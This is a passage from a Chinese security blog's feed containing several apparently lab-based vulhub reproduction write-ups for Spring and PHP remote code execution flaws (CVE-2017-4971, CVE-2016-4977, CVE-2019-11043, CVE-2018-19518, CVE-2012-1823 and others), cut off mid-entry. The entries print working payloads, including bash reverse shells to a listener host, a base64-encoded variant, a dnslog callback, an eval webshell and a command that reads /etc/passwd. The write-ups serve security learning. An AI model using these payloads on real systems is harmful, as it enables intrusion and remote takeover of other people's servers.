      <link href="/2022/05/06/Spring-WebFlow/"/>
      <url>/2022/05/06/Spring-WebFlow/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-WebFlow远程代码执行漏洞"><a href="#Spring-WebFlow远程代码执行漏洞" class="headerlink" title="Spring-WebFlow远程代码执行漏洞"></a>Spring-WebFlow远程代码执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring WebFlow 2.4.0 - 2.4.4</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2017-4971docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506170325448.png" alt="image-20220506170325448"></p><p>点开<code>login</code></p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506170405556.png" alt="image-20220506170405556"></p><p>在这里用他给的账号登录</p><p>进入之后打开<code>http://192.168.3.151:8080/hotels/1</code></p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506170833403.png" alt="image-20220506170833403"></p><p>预约</p><p>输入信息后点击这个</p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506171056518.png" alt="image-20220506171056518"></p><p>然后点击<code>Confirm</code></p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506171403884.png" alt="image-20220506171403884"></p><p>抓包</p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506171423970.png" alt="image-20220506171423970"></p><p>构造payload</p><pre class=" language-base"><code class="language-base">&_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.3.134/4444+0>%261")).start()=vulhub</code></pre><p>设置监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p><img src="/2022/05/06/Spring-WebFlow/image-20220506172837432.png" alt="image-20220506172837432"></p><p>然后放行端口</p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506172851423.png" alt="image-20220506172851423"></p><p>显示500</p><p>连接成功！</p><p><img src="/2022/05/06/Spring-WebFlow/image-20220506172919030.png" alt="image-20220506172919030"></p><p>结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</title>
      <link href="/2022/05/06/Spring-security-OAuth2/"/>
      <url>/2022/05/06/Spring-security-OAuth2/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Security-OAuth2远程命令执行漏洞"><a href="#Spring-Security-OAuth2远程命令执行漏洞" class="headerlink" title="Spring Security OAuth2远程命令执行漏洞"></a>Spring Security OAuth2远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><p>远程攻击者可通过为‘<code>response_type</code>’参数制作值利用该漏洞执行代码。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring Security OAuth 1.0.0到1.0.5<br>Spring Security OAuth 2.0.0到2.0.9<br>Spring Security OAuth 2.0到2.0.14<br>Spring Security OAuth 2.1到2.1.1<br>Spring Security OAuth 2.2到2.2.1<br>Spring Security OAuth 2.3到2.3.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2016-4977docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先打开网页</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506131932482.png" alt="image-20220506131932482"></p><p>访问<code>http://192.168.3.151:8080/oauth/authorize</code></p><p>需要登录，账号密码都是<code>admin</code></p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506132208724.png" alt="image-20220506132208724"></p><p>构造参数</p><pre class=" language-base"><code class="language-base">?response_type=$&#123;2*3&#125;&client_id=acme&scope=openid&redirect_uri=http://test</code></pre><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506132455299.png" alt="image-20220506132455299"></p><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>打开<a href="http://dnslog.cn/">dnslog</a></p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506133205933.png" alt="image-20220506133205933"></p><p>得到一个随机的dns</p><p>然后构造参数</p><pre class=" language-Linux"><code class="language-Linux">curl `whomai`.xcexay.dnslog.cn</code></pre><p>再打开转换工具<a href="https://x.hacking8.com/?post=293">java命令执行payload</a></p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506133227187.png" alt="image-20220506133227187"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC54Y2V4YXkuZG5zbG9nLmNu&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>接下来使用官方的小玩意</p><p><a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py">poc.py</a></p><p>使用这个</p><pre class=" language-Linux"><code class="language-Linux">python3 poc.py</code></pre><p>然后把上面的东西扔进去</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506133954553.png" alt="image-20220506133954553"></p><p>把下面这一坨复制下来</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134029466.png" alt="image-20220506134029466"></p><p>扔在这里</p><p>出来回显</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134056414.png" alt="image-20220506134056414"></p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>然后在kali上设置监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>把shell编码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134458155.png" alt="image-20220506134458155"></p><p>用poc.py把编码再搞一下</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134632044.png" alt="image-20220506134632044"></p><p>最后把这上面的东西复制过去</p><p>连接成功</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134754094.png" alt="image-20220506134754094"></p><p>ok结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php-xDebug远程调试漏洞(代码执行)</title>
      <link href="/2022/05/06/php-xDebug/"/>
      <url>/2022/05/06/php-xDebug/</url>
      
        <content type="html"><![CDATA[<h1 id="XDebug远程调试漏洞"><a href="#XDebug远程调试漏洞" class="headerlink" title="XDebug远程调试漏洞"></a>XDebug远程调试漏洞</h1><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><blockquote><p>Xdebug是一个开放源代码的PHP程序调试器(即一个Debug工具)，可以用来跟踪，调试和分析PHP程序的运行状况。</p><p>如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code></p></blockquote><pre class=" language-base"><code class="language-base">xdebug.remote_connect_back = 1xdebug.remote_enable = 1</code></pre><blockquote><p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/xdebug-rcedocker-compose up -d</code></pre><p>启动完成后打开<code>http://192.168.3.151:8080</code>发现主页是phpinfo</p><p>查看xdebug配置</p><p><img src="/2022/05/06/php-xDebug/image-20220506093036691.png" alt="image-20220506093036691"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用官方的<a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">漏洞复现脚本</a></p><pre class=" language-Linux"><code class="language-Linux">python3 exp.py -t http://192.168.3.151:8080/index.php -c 'shell_exec('id');'</code></pre><p><img src="/2022/05/06/php-xDebug/image-20220506093943235.png" alt="image-20220506093943235"></p><p>看一下<code>/etc/passwd</code></p><pre class=" language-Linux"><code class="language-Linux">python3 exp.py -t http://192.168.3.151:8080/index.php -c 'shell_exec("cat /etc/passwd");'</code></pre><p><img src="/2022/05/06/php-xDebug/image-20220506094052923.png" alt="image-20220506094052923"></p><p>结束！！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件包含漏洞(利用phpinfo)</title>
      <link href="/2022/05/06/php-inclusion/"/>
      <url>/2022/05/06/php-inclusion/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/inclusiondocker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用脚本实现<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</a></p><p>成功包含临时文件后，会执行<code>&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</code>，写入一个新文件<code>/tmp/g</code></p><p>命令执行</p><pre class=" language-Linux"><code class="language-Linux">python exp.py 192.168.3.151 8080 100</code></pre><p><img src="/2022/05/06/php-inclusion/image-20220506085858719.png" alt="image-20220506085858719"></p><p>执行成功后打开网页看看</p><pre class=" language-base"><code class="language-base">http://192.168.3.151:8080/lfi.php?file=/tmp/g&1=system('id');</code></pre><p><img src="/2022/05/06/php-inclusion/image-20220506090059840.png" alt="image-20220506090059840"></p><p>结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM Fastcgi未授权访问漏洞</title>
      <link href="/2022/05/05/php-fpm-fastcgi/"/>
      <url>/2022/05/05/php-fpm-fastcgi/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-FPM-Fastcgi未授权访问漏洞"><a href="#PHP-FPM-Fastcgi未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi未授权访问漏洞"></a>PHP-FPM Fastcgi未授权访问漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/fpmdocker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>下载上面的那玩意</p><p>然后利用</p><pre class=" language-Linux"><code class="language-Linux">python fpm.py 192.168.3.151 /usr/local/lib/php/PEAR.php</code></pre><p><img src="/2022/05/05/php-fpm-fastcgi/image-20220505210059370.png" alt="image-20220505210059370"></p><p>任意命令执行</p><pre class=" language-python"><code class="language-python">python fpm<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.151</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>PEAR<span class="token punctuation">.</span>php <span class="token operator">-</span>c <span class="token string">'&lt;?php echo `pwd`;?>'</span></code></pre><p><img src="/2022/05/05/php-fpm-fastcgi/image-20220505210153531.png" alt="image-20220505210153531"></p><pre class=" language-python"><code class="language-python">python fpm<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">3.151</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>PEAR<span class="token punctuation">.</span>php <span class="token operator">-</span>c <span class="token string">'&lt;?php echo `ls`;?>'</span> </code></pre><p><img src="/2022/05/05/php-fpm-fastcgi/image-20220505210218025.png" alt="image-20220505210218025"></p><p>结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-FPM远程代码执行漏洞(CVE-2019-11043)</title>
      <link href="/2022/05/05/php-fpm/"/>
      <url>/2022/05/05/php-fpm/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-FPM远程代码执行漏洞"><a href="#PHP-FPM远程代码执行漏洞" class="headerlink" title="PHP-FPM远程代码执行漏洞"></a>PHP-FPM远程代码执行漏洞</h1><h2 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h2><blockquote><p>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器，对于PHP 5.3.3之前的php来说，是一个补丁包，旨在将FastCGI进程管理整合进PHP包中。如果你使用的是PHP5.3.3之前的PHP的话，就必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。</p></blockquote><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/CVE-2019-11043docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用写好的工具</p><pre class=" language-base"><code class="language-base">https://github.com/neex/phuip-fpizdam</code></pre><p>因为这个用<code>golang</code>写的，所以要先安装go环境然后换源</p><pre class=" language-Linux"><code class="language-Linux">apt-get install golang -ygo env -w GO111MODULE=ongo env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</code></pre><p>下载EXP</p><pre class=" language-Linux"><code class="language-Linux">git clone https://github.com/neex/phuip-fpizdam   </code></pre><p>下载好之后进入目录</p><pre class=" language-Linux"><code class="language-Linux">cd phuip-fpizdam</code></pre><p>编译</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> build</code></pre><p><img src="/2022/05/05/php-fpm/image-20220505203729635.png" alt="image-20220505203729635"></p><p>使用EXP</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> run <span class="token punctuation">.</span> <span class="token string">"http://192.168.3.151:8080/index.php"</span></code></pre><p><img src="/2022/05/05/php-fpm/image-20220505203811564.png" alt="image-20220505203811564"></p><p>执行成功，可以命令执行</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.151:8080/index.php?a=id</code></pre><p><img src="/2022/05/05/php-fpm/image-20220505203947685.png" alt="image-20220505203947685"></p><p>成了！结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-IMAP远程命令执行漏洞(CVE-2018-19518)</title>
      <link href="/2022/05/05/php-imap/"/>
      <url>/2022/05/05/php-imap/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-IMAP命令执行漏洞"><a href="#PHP-IMAP命令执行漏洞" class="headerlink" title="PHP-IMAP命令执行漏洞"></a>PHP-IMAP命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p><p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>PHP:5.6.38</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/CVE-2018-19518docker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>访问网站并用burpsuite抓包</p><p><img src="/2022/05/05/php-imap/image-20220505172121646.png" alt="image-20220505172121646"></p><p>将<code>echo &#39;654321&#39;&gt;/tmp/123456</code>，base64编码</p><p>构造payload</p><pre class=" language-base"><code class="language-base">hostname=a -oProxyCommand=echo echo '654321'>/tmp/123456|base64 -d|sh&#125;&username=2&password=3hostname=a+-oProxyCommand%3decho%09ZWNobyAnNjU0MzIxJz4vdG1wLzEyMzQ1Ng%3d%3d|base64%09-d|sh&#125;&username=2&password=3</code></pre><p><img src="/2022/05/05/php-imap/image-20220505172856723.png" alt="image-20220505172856723"></p><p>看看有没有执行成功</p><p>进入docker容器</p><pre class=" language-Linux"><code class="language-Linux">docker-compose exec web bash</code></pre><p>查看</p><p><img src="/2022/05/05/php-imap/image-20220505183135012.png" alt="image-20220505183135012"></p><p>成功！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-CGI远程代码执行漏洞(CVE-2012-1823)</title>
      <link href="/2022/05/05/php-cgi/"/>
      <url>/2022/05/05/php-cgi/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-CGI远程代码执行漏洞"><a href="#PHP-CGI远程代码执行漏洞" class="headerlink" title="PHP-CGI远程代码执行漏洞"></a>PHP-CGI远程代码执行漏洞</h1><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><blockquote><p>CGI（Common Gateway Interface）全称是“通用网关接口”，它是Web服务器与外部应用程序（CGI程序）之间传递信息的接口标准。通过CGI接口，Web服务器就能够获取客户端提交的信息，并转交给服务器端的CGI程序处理，最后返回结果给客户端。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。</p></blockquote><h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><blockquote><p>Fastcgi是cgi的升级版，是用来提高CGI程序性能的（也是一种协议）。</p><p>FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。它还支持分布式的运算，即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。</p><p>FastCGI是与语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因。</p></blockquote><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p><p>探究一下原理，<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>中规定，当querystring中不包含没有解码的<code>=</code>号的情况下，要将querystring作为cgi的参数传入。所以，Apache服务器按要求实现了这个功能。</p><p>但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。</p><p>2004年有个开发者删掉了<code>if(!cgi) getopt(...)</code></p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>php &lt; 5.3.12 or php &lt; 5.4.2</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="cgi模式下的参数"><a href="#cgi模式下的参数" class="headerlink" title="cgi模式下的参数"></a>cgi模式下的参数</h3><ul><li><code>-c</code> 指定php.ini文件的位置</li><li><code>-n</code> 不要加载php.ini文件</li><li><code>-d</code> 指定配置项</li><li><code>-b</code> 启动fastcgi进程</li><li><code>-s</code> 显示文件源码</li><li><code>-T</code> 执行指定次该文件</li><li><code>-h</code>和<code>-?</code> 显示帮助</li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先看看页面</p><p><img src="/2022/05/05/php-cgi/image-20220505164619153.png" alt="image-20220505164619153"></p><p>利用<code>-s</code>查看网页源码</p><pre><code>http://192.168.3.151:8080/?-s</code></pre><p><img src="/2022/05/05/php-cgi/image-20220505164819170.png" alt="image-20220505164819170"></p><p>构造payload</p><pre><code>?-d allow_url_include=on -d auto_prepend_file=php://input&lt;?php echo shell_exec(&#39;ls&#39;);?&gt;</code></pre><p><img src="/2022/05/05/php-cgi/image-20220505165537713.png" alt="image-20220505165537713"></p><p>结束！！</p><h2 id="CVE-2012-2311"><a href="#CVE-2012-2311" class="headerlink" 